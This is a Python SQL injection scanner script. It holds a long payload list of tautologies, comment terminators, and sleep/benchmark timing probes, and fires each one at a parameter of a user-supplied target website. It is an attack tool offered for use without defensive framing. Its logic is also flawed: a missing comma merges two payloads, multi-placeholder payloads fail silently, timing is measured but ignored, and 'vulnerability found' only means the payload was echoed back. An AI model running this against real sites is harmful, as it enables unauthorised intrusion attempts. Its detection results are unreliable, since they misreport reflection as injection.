import requests
import time

# List of payloads to test for SQL injection
payloads = [
    "'{}",
    "{}'",
    "{}#",
    "{}/*",
    "{}%00",
    "{}%23",
    "'%20or%20'1'%3D'1",
    "'%20or%20'1'%3D1%23",
    "'%20or%201%3D1",
    "'%20or%201%3D1%23",
    "'%20or%20''='",
    "'%20or%20''='%23",
    "')%20or%20('x'='x",
    "') or ('x'='x",
    "') or '1'='1",
    '") or ("x"="x',
    '") or "x"="x',
    '") or "1"="1',
    "\" or \"x\"=\"x",
    "\" or \"1\"=\"1",
    "' or sleep(5) = '",
    "' or sleep(10) = '",
    "' or benchmark(10000000,md5(1))#",
    "' and 1=(select count(*) from tablename); --",
    "' and 1=(select count(*) from tablename where columnname LIKE 'A%'); --"
    # Basic payloads
    "'{}",
    "{}'",
    '{}',
    '{} ',
    '{}%00',
    '"{}"',
    "{}#",
    "{}--",
    "{}/**/",
    "{}/*!",
    "/**/{}",
    "{}/*",
    "{};--",
    "{};#",
    "{}%20",
    "{}%25",
    "{}%0A",
    "{}%0D",
    "{}%09",
    '{}-- -',
    '{}#',
    '{}/*',
    '{}%0d%0a',
    '{}%23',
    '{}%26',
    '{}%3b',
    '{}%7c',
    '{}\\',
    '{}|',
    '{}$',
    '{}%0a',
    '{}%09%0a',
    '{}%0A%09',
    '{}%09%23',
    '{}%20%23',
    '{}%0D%0A%20',
    '{}%0D%0A%09',
    '{}%0D%0A%0D%0A',
    '{}%23%0D%0A',
    '{}%23%0D%0A%09',
    '{}%23%0D%0A%20',
    '{}%23%0A',
    '{}%23%20',
    '{}%23%09',
    '{}%20%3B',
    '{}%09%3B',
    '{}%20--%20',
    '{}%0d%0a%23%20',
    '{}%0d%0a%20%23',
    '{}%20%23%0d%0a',
    '{}%20%0d%0a%23',
    '{}%20%23%20',
    '{}%0d%0a%09%23%20',
    '{}%0d%0a%20%09%23',
    '{}%20%09%0d%0a%23',
    '{}%20%09%23%0d%0a',
    '{}%23%20%0d%0a',
    '{}%23%0d%0a%20%09',
    '{}%20and%20{}={}',
    '{}%20and%20{}>{}/',
    '{}%20and%20{}>{}',
]

def scan_sql_injection(url, params):
    for param, value in params:
        for payload in payloads:
            modified_params = params.copy()
            modified_params.remove((param, value))
            modified_params.append((param, payload.format(value)))
            try:
                print(f"Trying payload '{payload.format(value)}'")
                start_time = time.time()
                response = requests.get(url, params=dict(modified_params))
                end_time = time.time()
                elapsed_time = end_time - start_time
                if payload.format(value) in response.text:
                    print(f"[+] SQL Injection vulnerability found on {url} with parameter '{param}' using payload '{payload.format(value)}'")
            except Exception as e:
                print(f"Error occurred: {e}")

# Example usage
url = 'Inter your Terget Website'
params = [('q', 'test')]

scan_sql_injection(url, params)
